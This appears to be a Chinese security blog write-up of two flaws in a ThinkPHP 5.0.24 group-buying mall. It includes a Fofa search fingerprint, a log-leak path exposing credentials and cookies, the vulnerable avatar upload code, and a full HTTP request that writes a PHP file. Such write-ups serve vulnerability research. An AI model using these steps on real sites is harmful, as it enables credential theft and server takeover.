#  某TP拼团零售商城系统RCE漏洞审计   
Mstir  星悦安全   2024-07-20 10:27  
  
## 0x00 前言  
  
**ThinkPHP5 拼团拼购系统，支持热门商品，余额总览，红包分销，商品销售，购物车等功能，后台使用管理系统所构建.**  
  
**Fofa:"/public/static/plugins/zepto/dist/zepto.js"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5frMNNa3fex9jpuATUJMHdhxQ5WeU7dImQkg9Sp9xRrhp9fr9Gk03cOiaFsPMgk8Qfjac4rl7k0l4g/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5frMNNa3fex9jpuATUJMHdh4RQDOvhmlQBBvTybUBX9EicQ92GaIcaXgqngpMxjDnfH0u2y7KUxUxA/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5frMNNa3fex9jpuATUJMHdhVKBsBiby0DxfmWk9vWkvU0xjLKZx0X0Pc4hDxXiaGpOMPWxYmBvEI44w/640?wx_fmt=jpeg&from=appmsg "")  
  
**框架:ThinkPHP 5.0.24 Debug:True**  
## 0x01 前台Log日志泄露漏洞  
  
  
**由于是TP5.0.24 开了debug，且根目录就能访问到，导致日志泄露，这里能看到普通用户访问日志和管理员的访问日志，甚至还有Cookie和登录时的账号密码.**  
  
**Payload 这种格式****:**  
```
/runtime/log/202407/20.log
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5frMNNa3fex9jpuATUJMHdhDay2cy2wY7GlUtDyIV1MzgmoOc6ngemlwgPszxrN6icphVjWUmEHqVA/640?wx_fmt=other&from=appmsg "")  
****## 0x02 前台任意文件写入漏洞  
  
**在 /home/controller/User.php 控制器的 avatar 方法中，有一处很明显的通过Base64进行文件写入的操作，通过input('base64')来传递文件内容及文件名，然后经过 uploadOneBase64Image 方法来写入.**  
```
/*
* 个人信息
*/
public function avatar()
{
    $userLogic = new \app\common\logic\UsersLogic();
    $base64Image = input('base64');
    if ($base64Image) {

      $dirName = "home" . DS . "user" . DS . "head_pic";
      $time = time();
      // 检验时间
      if($this->user["head_time"] > 0){

        if($time - $this->user["head_time"]  < 60){
          //                    ajaxReturn(0,'notice',"系统升级中，不能修改头像，敬请谅解");
        }
      }

      $back_img = uploadOneBase64Image($base64Image,$dirName);
      if(!empty($back_img["error"])){
        ajaxReturn(0,'notice',$back_img["error"]);
      }

      $update = $userLogic->update_info($this->user_id, [
                                        "head_pic"=>$back_img["imageUrl"],
                                        "head_time"=>$time,
                                        ]);

      if (!$update){
        ajaxReturn(0,'notice',"头像更新失败！");
      }else{
        ajaxReturn(1,'success',"头像更新成功！",str_replace("\\",'/',$back_img["imageUrl"]),"/home/user/userinfo.html");
      }
    }
  }
```  
  
**不过我们全局搜索 uploadOneBase64Image 并没有找到这个方法，因为其实际上在/application/common.php 中，该文件整个都被混淆加密了.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5frMNNa3fex9jpuATUJMHdh1MlnGLSDgWGdtmXrXSgn9b89pLdaDWcC9Xg0rF2NEBfC2NLCwCib1gQ/640?wx_fmt=png&from=appmsg "")  
  
**Payload [****需要普通用户登录权限****]:**  
```
POST /home/user/avatar HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 65
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=kplfq401bdcmql31vr7jp2s6ul; user_id=1; uname=%25E5%2588%2598%25E6%2580%25BB
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/home
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

base64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5frMNNa3fex9jpuATUJMHdhic2uiaysrYVkodloIde5FsxIIrQE8hebOmZok22jGmMclYqyrparrMXQ/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5frMNNa3fex9jpuATUJMHdhRkqIqPLwAumqPib2jn1Up8ORUj4GgN8iamib9ZlT4klc2JF7ZaZJDqOlw/640?wx_fmt=other&from=appmsg "")  
  
**商城系统源码关注公众号发送 sc 获取**  
  
# 免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!  
  
